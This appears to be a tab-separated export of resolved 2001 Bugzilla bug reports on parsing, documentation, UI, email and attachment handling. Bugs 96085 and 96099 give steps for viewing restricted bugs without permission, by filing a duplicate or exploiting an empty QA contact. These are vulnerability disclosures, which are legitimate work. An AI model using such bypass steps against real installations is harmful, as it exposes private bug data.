95857%TAB%998058557%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%process_bug.cgi looks for user with empty address in cc: list,process_bug.cgi sees blank address in cc: list (__UNKNOWN__)%TAB%process_bug.cgi looks for user with empty address in cc: list,process_bug.cgi sees blank address in cc: list (__UNKNOWN__)process_bug.cgi appears to be parsing the cc: list such that it thinks the user submitting changes has entered a user with a blank email address into cc: field.  Apparently this is triggered if the user enters two commas in a row into the cc: list field, although some users claim that it happened when they didn't do that.  Bug 95798 exacerbates this problem, as does the presence of a user on b.m.o. with a blank login name (email address).
95889%TAB%998083249%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Lots of spurious commas in the activity table on keywords%TAB%Lots of spurious commas in the activity table on keywordsAfter the b.m.o update, the activity table is showing lots of extra commas in the entries where more than one keyword was added or removed.  I suspect this code is at fault:              my @old = split(/[ ,]/, $oldvalue);             my @new = split(/[ ,]/, $newvalue);  The keywords entries already had comma-space for the separators, and the above split only matches a single character.  Thus we wound up with a lot of null records accidently created on a lot of bugs.  The patch for this will need two parts to it. a) fix the conversion algorithm so it doesn't bite any other installs b) go back and scan the activity table for keywords entries and fix the corruption it caused to the existing entries (remove extra commas from the records) so when b.m.o updates next, it fixes it.
95890%TAB%998084122%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Changing a keyword to a keyword+ fails to record in bugmail/activity log%TAB%Changing a keyword to a keyword+ fails to record in bugmail/activity logIf you have a standard keyword (say nsenterprise) and you change that keyword to one with a plus on the end (say nsenterprise+), it records the regular one being removed, but does not record the addition of the + keyword, even though it happens.
95923%TAB%998117045%TAB%34095%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Red banner indicating what fields may be changed,Don't let user change fields they aren't allowed to change.%TAB%Red banner indicating what fields may be changed,Don't let user change fields they aren't allowed to change.After being very thorough in filling out the bug form I was able to be blinded by the bright red banner several times saying I could not do such and such to certain fields because I was not the owner etc.  If I cannot do certain things to certain fields, you should not allow me to do them in the first place, or you might just list the fields on the next page that were not changed for the indicated reasons instead of beating me up for trying to be thorough.
95970%TAB%998176231%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Documentation%TAB%Need a Reviewers Guide for Bugzilla,Need a "Bugzilla Hacking Guide"%TAB%Need a Reviewers Guide for Bugzilla,Need a "Bugzilla Hacking Guide"We need to create a "Reviewers Guide" for Bugzilla which contains preferred coding practices and also common gotchas that that reviewers often overlook because they're not something you'd normally think about.  The situation this last weekend at bugzilla.mozilla.org is a real good example of a tragedy that could have been prevented had a common perl gotcha been noticed by either of the two people who reviewed a certain patch.  (See bug 95890 if you want all the gory details - short story is b.m.o is having to pull a backup and reconstruct a good portion of the bugs_activity table)  To start off the common gotchas section: 1) Any variable included inside a regular expression must be quoted with \Q..\E unless the variable is intended to contain a regular expression. 2) avoid using regexps for grep if you're looking for an exact match, instead use a code block to compare equivalency ( grep($_ eq $matchstr, @list); )  These two are what bit us in the butt on b.m.o the other day.I'm sure we can come up with more, too.  In this guide, we should also come up with some standard testing procedures for testing new code before it's checked into cvs.  We have landfill at our disposal, but it doesn't seem to be enough.  Is there stuff we can add to landfill to assist testing?  Or certain tests we need to remember to perform?  Maybe we should make a requirement in the reviewer guide that a list of things that need to be tested to validate a given patch should be included in the bug report before the patch is tested and checked in...  A checklist of things that patch stands a remote chance of affecting, etc.... thoughts anyone?
96003%TAB%998224582%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Query/Bug List%TAB%buglist.cgi shouldn't find all bugs if loaded directly,buglist.cgi shouldn't find all bugs if loaded without parameters,buglist.cgi shouldn't find all bugs if loaded directly,buglist.cgi shouldn't find all bugs if loaded without parameters%TAB%buglist.cgi shouldn't find all bugs if loaded directly,buglist.cgi shouldn't find all bugs if loaded without parameters,buglist.cgi shouldn't find all bugs if loaded directly,buglist.cgi shouldn't find all bugs if loaded without parametersbuglist.cgi got into my URL history somehow, and now I sometimes accidentally select it from the auto-completion list as I am typing in a Bugzilla URL.  When I do, it queries the database for all bugs and tries to display the list (until I cancel the request).  Instead of doing this, it should display an error or forward me to query.cgi.
96063%TAB%998292957%TAB%17687%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Miscellaneous,Bugzilla,Bugzilla-General%TAB%buglist is to long for bugzilla,duplicates.cgi generates over-long URLs%TAB%buglist is to long for bugzilla,duplicates.cgi generates over-long URLs"Give me this list as a Bugzilla bug list." produces a 414 because there are to many bugs in the query.  Request-URI Too Large The requested URL's length exceeds the capacity limit for this server.  request failed: URI too long
96085%TAB%998299224%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%bypassing group security checks using duplicate bugs%TAB%bypassing group security checks using duplicate bugsIts possible for the bugzilla group security stuff to be bypassed by filing a duplicate bug. This will add you to the cc list, and so, by default, you'll be able to see the bug.  To reproduce:  1. Have a restricted bug which is open to people on the cclist (http://landfill.tequilarista.org/bugzilla-tip/show_bug.cgi?id=278) 2. As a user not in that group, file a bug, and dupe it against the bug which you cannot see (http://landfill.tequilarista.org/bugzilla-tip/show_bug.cgi?id=279)  3. You can now view bug 278
96099%TAB%998306294%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%empty QA contact allows users who aren't lgged in to bypass group security%TAB%empty QA contact allows users who aren't lgged in to bypass group securityAlso see bug 96085.  If qa contacts are disabled, or the field is empty, then non logged in users can see bugs they don't have permission to see. (Bug 28698, which is nsconf, was open until I added nobody@mozilla.org to be the QA contact)  If you're logged in, or the QA contact doesn't have the ability to see the bug anyway, then this doesn't occur.  I don't think its possible to have an empty reporter or assignee, so I couldn't test if those were also affected.
96209%TAB%998367159%TAB%3821%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla Helper,Bugzilla-General%TAB%ReplaceComponentSelect is ineffecient in Mozilla%TAB%ReplaceComponentSelect is ineffecient in MozillaIn the file bugreport.js the function ReplaceComponentSelect needs to be  changed, the setting of of the text and values for each option is really slow in mozilla and the fix is non-trivial and very involved. If you  could change the function to be as follows below it would help out a lot. I have a testcase in Bug 62568 so that will live on.   function ReplaceComponentSelect( aForm, anArray ) {      aForm.Component.options.length = 0;      for ( var i = 0; i < anArray.length; i++ ) {          aForm.Component.options[i]  = new Option(anArray[i], anArray[i]);      }      aForm.Component.selectedIndex = 0;  }
96398%TAB%998436422%TAB%17687%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Reporting/Charting%TAB%bugnumber ordering looses content,Resorting duplicates page doesn't sort visible list%TAB%bugnumber ordering looses content,Resorting duplicates page doesn't sort visible listIf you change the maxrows param in the URL to something big enough, then you do get bug#915 when sorting by bug number. (I tried 3000, and it found it).  So I guess the question is: should the sorting by bug_no only process the top maxrows duplicates?
96431%TAB%998463038%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%It's possible to write an essay in the Summary field.%TAB%It's possible to write an essay in the Summary field.This is a spinoff of bug 92266.  Copying some info from a comment by Dave: ----- <...> I was disturbed however, to discover that the summary and  status_whiteboard fields on bugs are both mediumints in the database (which is  32K), and no validation is performed within Bugzilla to make sure they fit  anything.  <...>  The summary/status_whiteboard issue is probably good for  another bug.  It's infrequent enough (22 bugs affected out of 96000 on b.m.o  according to Myk) that it's probably not a rush issue. <...> -----  This is intended to be the aformentioned "other bug".  PS, bug 92266 fixed the issue regarding dataloss on long summaries, but the  summaries just shouldn't be that long (and neither should status_whiteboard).
96451%TAB%998469886%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%Vote reduction code doesn't take votes per person per bug into account%TAB%Vote reduction code doesn't take votes per person per bug into account[13:15:51] <MattyT> jake there's a problem with your voting stuff          [13:15:52] <MattyT> by default votes per person per bug is set to 99999 and votes per person to 0          [13:15:52] <MattyT> if you change votes per person up to 5, everything will work ok          [13:15:54] <MattyT> except if u reduce the votes the votes per person to 3 it won't touch any of the bugs because they are  less than 99999 [13:15:57] <MattyT> whereas it should reduce to each vote to min( votes per person, votes per person per bug )
96498%TAB%998479599%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Documentation%TAB%Documentation for LDAP in Bugzilla Guide%TAB%Documentation for LDAP in Bugzilla GuideAttached is the text file I wrote up with basic instructions for getting LDAP  working under Bugzilla.
96501%TAB%998479769%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Documentation%TAB%Bug groups example in Bugzilla Guide%TAB%Bug groups example in Bugzilla GuideAttached is the example of bug groups in Bugzilla which I wrote up.
96534%TAB%998489901%TAB%34314%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface,Query/Bug List%TAB%improve javascript on query page for IE 5+  browser,query.cgi is slow to reflow when you change the product field%TAB%improve javascript on query page for IE 5+  browser,query.cgi is slow to reflow when you change the product fieldThe javascript is really slow when selecting a product on the query page using Internet Explorer 5+.  Note: reason for being slow is that there are many products, components, and versions for the javascript to work with. Query Page works fine on Internet Explorer when the number of components,versions,products is low.  However the javascript works fine on Netscape even with a large list of products, components, and versions.  Is there a way to modify the javascript so that Internet Explorer will perform as well as Netscape? (with a large list of products,components and versions)
96675%TAB%998558049%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration,Installation%TAB%checksetup should require admin e-mail address satisfy emailregexp.%TAB%checksetup should require admin e-mail address satisfy emailregexp.When checksetup.pl initialises an installation, it asks for the admin address.  I use a local user, since I don't have sendmail set up to do remote mailing.  Then it doesn't let that user log in because the address doesn't match emailregexp.  I think that part might not be new.  I don't have a problem with that behaviour - it shouldn't create the account in the first place.  Instead, if the admin account doesn't satisfy the default emailregexp, we should  write out a more lax emailregexp and emailregexpdesc.  Optionally, we could confirm this action out front.
96677%TAB%998558218%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Documentation%TAB%Shadow directory no longer exists.%TAB%Shadow directory no longer exists.FAQ A.8.9 refers to the shadow directory.  It no longer exists.  Is this section even accurate
96679%TAB%998558320%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Documentation%TAB%Sanity check is not exhaustive.%TAB%Sanity check is not exhaustive.FAQ A.8.3 talks about using the sanity check to determine whether you have corruption.  It says if sanity check comes up clear you are OK.  However this is not true as sanity check is not exhaustive, though you are "probably OK".
97068%TAB%998835968%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%FAQ Section A.4.7 contains unescaped HTML code%TAB%FAQ Section A.4.7 contains unescaped HTML codeIn a newsgroup posting you quoted which I wrote, the quoted section is missing some of the HTML code that was in that post.  I'm assuming it's probably in the SGML source and didn't get escaped properly, so it tried to interpret it instead of putting it in the text.
97070%TAB%998837845%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Section 7 is between section C and section D%TAB%Section 7 is between section C and section DSection 7 is between section C and section D.  Is it supposed to be?  It looks funny in the table of contents.
97071%TAB%998838328%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Section A.7.6 describes doesn't explain "sendmailnow" well,Section A.7.6 doesn't explain "sendmailnow" very well%TAB%Section A.7.6 describes doesn't explain "sendmailnow" well,Section A.7.6 doesn't explain "sendmailnow" very wellSection A.7.6 describes eliminating the "-ODeliveryMode=deferred" from the sendmail invocation, then mentions that the "sendmailnow" param exists, but doesn't say what it does.  Since activating the "sendmailnow" param removes the -O command line flag, there is no reason they need to modify source to accomplish that.  All they need to do it turn on "sendmailnow" in editparams.
97185%TAB%998911840%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Query/Bug List%TAB%make_select should add a newline after each option%TAB%make_select should add a newline after each optionIn CGI.pl, there is a nice function called make_select. This nice function, however, doesn't add a newline to each option, making it quite impossible to see the options listed nicely in a view source window (or in any dump for that matter). It's quite easy to add a "\n" to each option, and it would only increase page size by a few bytes.
97191%TAB%998913240%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation,attachment and request management%TAB%Fixes to get attachments working under Win32 not documented.%TAB%Fixes to get attachments working under Win32 not documented.Had to fix references to <code>... it may be that <code> is unsupported in Docbook 4.1, which is what the Guide is using.  I changed refs to <function>, which is more accurate considering that binmode() is a function anyway...  Last bug for 2.14 release.  Just compiled it all to HTML, trying to find any terrifically nasty errors, and checking in.
97192%TAB%998913490%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Bug reporting reference to old component.%TAB%Bug reporting reference to old component.The Guide page geninstall.html says to report a bug to the old component.  It should either be updated to the new product, or changed to refer to the home page which will always contain the correct instructions.  Given people need to go online, this shouldn't be a problem.  That's what I did for the README.
97290%TAB%998974251%TAB%34532%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup.pl should report about errors in localconfig%TAB%checksetup.pl should report about errors in localconfigIf an error occurs when calling localconfig, none of the variables are defined.  If checksetup.pl detects undefined variables, it simply adds them to  localconfig. Thus an erroneous localconfig will grow with every call to  checksetup.pl, without giving a notice to the user.
97469%TAB%999071934%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%Assignee/QA/Reporter/CC don't get email on restricted bugs%TAB%Assignee/QA/Reporter/CC don't get email on restricted bugsThis is an offshoot from bug 39816, which made it possible for the Assignee, QA, Reporter, and CC list to see a bug even if they were not a member of the group the bug was restricted to.  However, processmail currently will not send email to users who are not members of the groups the bug is in.  Processmail needs to check for the role bits and act appropriately.
97471%TAB%999072184%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%assignee_accessible and qa_accessible are unnecessary%TAB%assignee_accessible and qa_accessible are unnecessaryI'd like to recommend removing the QA and Assignee checkboxes from the form.  The QA and the Assignee should ALWAYS be able to see a bug.  Perhaps if the reporter specifies that a bug belongs to a group that the assignee is not a member of, it should prompt the filer to confirm that they want to put the bug in that group, or use that assignee (but still allow it since the assignee would be able to see it anyway).  Same for QA.
97582%TAB%999133662%TAB%33998%TAB%CLOSED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting,Documentation%TAB%Broken link to download Chart::Base module%TAB%Broken link to download Chart::Base moduleThe Chart::Base module is unavailable from the link in the Bugzilla Guide. Can anyone suggest another link for downloading it? Without that I cannot see charts...
97588%TAB%999138077%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Installation & Upgrading%TAB%localconfig should mention access.conf as well as httpd.conf (for old apache)%TAB%localconfig should mention access.conf as well as httpd.conf (for old apache)The localconfig generated by the 2.14 checksetup mentions the bugzilla <Directory> block in an httpd.conf file.  In older Apache installs, this sort of info could have been stored in an access.conf  file as well, couldn't it?  Trivial patch to follow to mention this.
97590%TAB%999138734%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Confusing link on show votes page??%TAB%Confusing link on show votes page??On the show votes page, the first column is the bug number, but if you click on this bug number link, it takes you to the votes for that bug, and not to show_bug.cgi, which is where just about all the other links containing a bugid take you.  Is it just me that finds this a bit confusing/inconsistant.  Perhaps there should be a column with a text link that says 'show the votes for bug X'
97657%TAB%999170899%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%bug_form_pl_sillyness() used in defparams.pl causes subroutine redefined error%TAB%bug_form_pl_sillyness() used in defparams.pl causes subroutine redefined error==> /var/log/apache/bugzilla.lubricants-oil.com/error.log <== Subroutine bug_form_pl_sillyness redefined at 	/usr/lib/bugzilla/lib/perl5/bug_form.pl line 34 (#1)          (W redefine) You redefined a subroutine.  To suppress this warning, say              {     	no warnings;     	eval "sub name { ... }";         }      [Thu Aug 30 14:13:20 2001] show_bug.cgi: Subroutine bug_form_pl_sillyness redefined at /usr/lib/bugzilla/lib/perl5/bug_form.pl line 34.  Simply change bug_form_pl_sillyness() to defparams_pl_sillyness() to fix the issue:  diff -u defparams.pl.orig defparams.pl --- defparams.pl.orig	Mon Aug 27 09:00:39 2001 +++ defparams.pl	Thu Aug 30 15:01:14 2001 @@ -45,7 +45,7 @@  # Shut up misguided -w warnings about "used only once".  For some reason,  # "use vars" chokes on me when I try it here.   -sub bug_form_pl_sillyness { +sub defparams_pl_sillyness {      my $zz;      $zz = %::param_checker;      $zz = %::param_desc;
97668%TAB%999174834%TAB%22500%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading,Documentation%TAB%.htaccess created by checksetup.pl is bad%TAB%.htaccess created by checksetup.pl is badThe default .htaccess created by checksetup.pl was incorrect.  There is a line in it like:  <FilesMatch ^(.*\.pl|localconfig|processmail|syncshadowdb)$>  That "^" should not be there.  A "diff -c" with the correction is:  *** checksetup.pl       Thu Aug 30 16:31:20 2001 --- checksetup.pl.orig  Thu Aug 30 16:31:03 2001 *************** *** 569,575 ****       open HTACCESS, ">.htaccess";       print HTACCESS <<'END';   # don't allow people to retrieve non-cgi executable files or our private data ! <FilesMatch (.*\.pl|localconfig|processmail|syncshadowdb)$>     deny from all   </FilesMatch>   END --- 569,575 ----       open HTACCESS, ">.htaccess";       print HTACCESS <<'END';   # don't allow people to retrieve non-cgi executable files or our private data ! <FilesMatch ^(.*\.pl|localconfig|processmail|syncshadowdb)$>     deny from all   </FilesMatch>   END
97721%TAB%999202959%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General,Installation%TAB%New min. version for perl,New min. version for perl [5.005]%TAB%New min. version for perl,New min. version for perl [5.005]The attachment tracker that just went in uses the Template Toolkit, which only works on Perl 5.005 and newer.  Because of this usage and other planned useage of the Template Toolkit in Bugzilla, our new minimum version will have to be 5.005.
97729%TAB%999214194%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,attachment and request management%TAB%Uploaders need to be able to obsolete their own attachments%TAB%Uploaders need to be able to obsolete their own attachmentsDescription • 23 years ago Users who have uploaded attachments should be able to mark the obsolete flag on attachments they uploaded.
97739%TAB%999216330%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration,attachment and request management%TAB%Deleting attachment statuses should give confirmation even when JS off.%TAB%Deleting attachment statuses should give confirmation even when JS off.Apparently there's currently a confirmation that appears when you try and delete an attachment status that's in use.  However, it is written using JS and only appears if you have it on.  We should augment this with non-JS code.
97764%TAB%999230781%TAB%21544%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications,attachment and request management%TAB%Received bugmail when I changed attachment status%TAB%Received bugmail when I changed attachment statusI changed attachment-status (using the new patch-manager), to needs-work and second-review. I got a bugmail about this.  I shouldn't get bugmails with my own changes, because I have that feature turned off in my prefs. Highly annoying!
97784%TAB%999237484%TAB%14303%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,attachment and request management%TAB%Bugzilla attachment edit textareas missing wrap attribute%TAB%Bugzilla attachment edit textareas missing wrap attributeActual: You'll notice that none of the textareas wrap. This is because the wrap=hard  attribute is missing.  Expected: The textareas should wrap.  It's a shame that without the wrap attribute, Netscape 4 doesn't work correctly,  but it should still be supported.
97832%TAB%999255355%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%turn on template pre-compilation%TAB%turn on template pre-compilationThe template toolkit can pre-compile templates into Perl code, which is a performance win.  Enabling the feature is trivial.  It is just a configuration parameter:  http://www.template-toolkit.org/docs/aqua/Manual/Config.html#Caching_and_Compiling_Options my $template = Template->new({     COMPILE_EXT => '.atmlc', });
97868%TAB%999268584%TAB%22599%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General,User Interface,attachment and request management%TAB%Test - Why can I *edit* patches???,"Edit" action for attachments is misleading.,Rename the "Edit" action (for attachments) to something else%TAB%Test - Why can I *edit* patches???,"Edit" action for attachments is misleading.,Rename the "Edit" action (for attachments) to something elseI wonder why anyone with bug edit rights can edit patches. That's that harm the backlog and possibly infrige the copyright even? I wouldn't want my patches to be edited by others in a way that my opriginal patch isn't clearly seens anymore. Using this bug to test it.
97877%TAB%999271479%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%changed* operators don't work for attachment status%TAB%changed* operators don't work for attachment statusWhen using the boolean chart to query for bugs whose attachment status changed to a certain value, changed before or after a certain date, or were changed by a certain user, no bugs are found.  The other operators appear to work as intended.
97894%TAB%999283041%TAB%21768%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%check run remembered query when choosing a remembered query%TAB%check run remembered query when choosing a remembered queryCurrently there are two radio button that control the select list for remembered queries. One to run the query and one to forget it. I think that remembered queries are pretty neat, and I use it all the time, but I run into the following: 1. Select one of the remembered query 2. Submit. Get thousands of hits. The reason of course is that selecting one of the remembered queries doesn't automatically set the "run the remembered" query radio button. I think it should.  Most people run remembered queries hundreds of times and only delete any occasionally. Consequently it's reasonable to make the assumption that when somebody selects a remembered query, the user wants to run it, not delete it. With such an enhancement, deleting a query would be no more difficult than it is today (select the query, check the "delete this query" radio button, submit), but   running one would be easier and less error prone: select the query, submit.
97966%TAB%999365111%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Query JS nukes old selections.%TAB%Query JS nukes old selections.When you add a product to or remove a product from the products field on the query page, the old selections for components/versions/milestones are nuked.  You should save and restore them.
97971%TAB%999375320%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Sanity check should find bugs with open status and resolution or closed status and no resolution.,Sanity check should check statuses, resolutions, everconfirmed & number of votes.%TAB%Sanity check should find bugs with open status and resolution or closed status and no resolution.,Sanity check should check statuses, resolutions, everconfirmed & number of votes.Sanity check should find bugs with open status and resolution or closed status and no resolution.  It should use globals.pl to find out what is an open status so this knowledge can be changed centrally.
97980%TAB%999386575%TAB%34778%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%linefeeds from konqueror ignored%TAB%linefeeds from konqueror ignoredIf you don't have cookies and have to login then the bug text looses it's  linefeeds.
98021%TAB%999437940%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs,attachment and request management%TAB%BUTTON tags in template/default/attachment/edit.atml do not work with NS 4.7x%TAB%BUTTON tags in template/default/attachment/edit.atml do not work with NS 4.7xThe BUTTON tags used in template/default/attachment/edit.atml do not work with Netscape Communicator 4.72 under Linux (RH6.2).  Recommend that they be changed to INPUT tags with TYPE="BUTTON".
98024%TAB%999442637%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading,Testing Suite%TAB%t/1.t should use $^X instead of hard-coded path%TAB%t/1.t should use $^X instead of hard-coded patht/1.t should use $^X instead of hard-coding /usr/bonsai/bin/perl since it will always be invoked by another script that provides the path.
98049%TAB%999483099%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Hacker's guide should mention sanity check.%TAB%Hacker's guide should mention sanity check.Sanity check tends to lag behind the schema, so we should aim to get people to update it when they make schema changes.  Basically, we should add something to the hackers' guide saying that when you make schema changes you should think about modifying sanity check to support the new schema.  All referential columns should be checked.
98080%TAB%999504624%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs,attachment and request management%TAB%ask for an attachment number when no params are given%TAB%ask for an attachment number when no params are given  Error You did not enter a valid attachment number.  Please press Back and try again. - that's nice, but http://bugzilla.mozilla.org/show_bug.cgi gives: Search by bug number You may find a single bug by entering its bug id here: [      ]
98095%TAB%999522390%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading,Testing Suite,Bug Import/Export & Moving%TAB%importxml.pl fails perl -wc test%TAB%importxml.pl fails perl -wc testRunning 'perl -I. -wc importxml.pl' returns a warning or a failure. Attached patch will fix.
98110%TAB%999529281%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Creating/Changing Bugs,attachment and request management%TAB%Attachment change page looks different from bug change page.%TAB%Attachment change page looks different from bug change page.The attachment change page looks different from the bug change page.  In particular, there's no border around the majority of the text in N4.  They should be unified either way.
98111%TAB%999529402%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,attachment and request management%TAB%Surpassing attachment.%TAB%Surpassing attachment.You should be able to "surpass an attachment", ie choose a bug number to mark obsolete on the create attachment page when uploading your attachment, rather than having to do a second step (bonus points if it happens in the same email).  Maybe you might have a "surpass" link on the main screen too to fill this in automatically, but that might be a bit much.
98112%TAB%999530058%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Edit attachment should appear in comments.%TAB%Edit attachment should appear in comments.You should be able to edit the attachment at the attachment in the comments section as well as the attachments table.
98123%TAB%999539666%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts%TAB%Need a general user prefs table,Need a general user preferences table,Create a general user preferences table,Create a user preferences infrastructure (became 'General Settings')%TAB%Need a general user prefs table,Need a general user preferences table,Create a general user preferences table,Create a user preferences infrastructure (became 'General Settings')Originally, it was thought that the emailprefs table would also hold general prefs.  The thinking has changed and we need a general prefs table.  See bug 73665 for the emailprefs table.  user prefs such as the one in bug 7710 would go here.  The 'mybugslink' from profiles table might also want to get moved here.  And any new user prefs should go here as well.  Mark dependencies as needed.
98146%TAB%999567518%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Creating/Changing Bugs%TAB%Minor problem w/ error message if some sort of login error in doeditvotes,[security] Minor problem w/ error message if some sort of login error in doeditvotes%TAB%Minor problem w/ error message if some sort of login error in doeditvotes,[security] Minor problem w/ error message if some sort of login error in doeditvotesdoeditvotes.cgi contains the following:  > if ( (! defined $who) || (!$who) ) { > PutHeader("Bad login."); > > print "The login info got confused.  If you want to adjust the votes\n"; > print "for <tt>$::COOKIE{'Bugzilla_login'}</tt>, then please\n"; > print "<a href=showvotes.cgi?user=$who>click here</a>.<hr>\n"; > > PutFooter(); > > exit(); >}   If something went mad, and $who was undefined, then this warning message would try and use it in the showvotes.cgi link ( => http log warning + bad link generated)  Should the message just say 'please log in (again) and try again', or something like that?
98147%TAB%999568577%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs,attachment and request management%TAB%The 'ViewAll attachments' link should be greyed out if there are none%TAB%The 'ViewAll attachments' link should be greyed out if there are noneThe 'ViewAll' link in the new attachments table should be unavailable if there are no links.  And/Or if you click on it, and there are no attachments, then the  http://bugzilla.mozilla.org/attachment.cgi?bugid=98074&action=viewall  page should say 'there are no attachments to view', otherwise, you get a page that is potentially confusing, which says it is 'Viewing All Attachments', but there aren't actually any there.
98304%TAB%999625649%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General,Database%TAB%Allow Bugzilla to work with Postgres SQL (PgSQL),Allow Bugzilla to work with PostgresSQL (PgSQL),Allow Bugzilla to work with PostgreSQL (PgSQL),Make Bugzilla's SQL compatible with PostgreSQL (PgSQL),Make Bugzilla's SQL fully compatible with PostgreSQL (PgSQL),Make Bugzilla's SQL compatible with PostgreSQL (PgSQL),Make Bugzilla's SQL generally compatible with PostgreSQL (PgSQL)%TAB%Allow Bugzilla to work with Postgres SQL (PgSQL),Allow Bugzilla to work with PostgresSQL (PgSQL),Allow Bugzilla to work with PostgreSQL (PgSQL),Make Bugzilla's SQL compatible with PostgreSQL (PgSQL),Make Bugzilla's SQL fully compatible with PostgreSQL (PgSQL),Make Bugzilla's SQL compatible with PostgreSQL (PgSQL),Make Bugzilla's SQL generally compatible with PostgreSQL (PgSQL)David Lawrence is already in the process of converting bugzilla so that it will work with either MySQL or PgSQL.  I couldn't find a bug to go with it, so I'm creating one that the necessary patches can be posted to once they've gotten to a point of being usable.
98307%TAB%999627628%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%bugzilla.mozilla.org - does not comply with W3C DOM spec,QuickSearch does not comply with W3C DOM spec%TAB%bugzilla.mozilla.org - does not comply with W3C DOM spec,QuickSearch does not comply with W3C DOM specThis *could* be evangelism but I'll file it under Bugzilla ;-)  Currently the JS above will not work for DOM enabled browsers.  I will attach a patch to fix that.  CCing default Tech Evangelism/US English owners for QA.
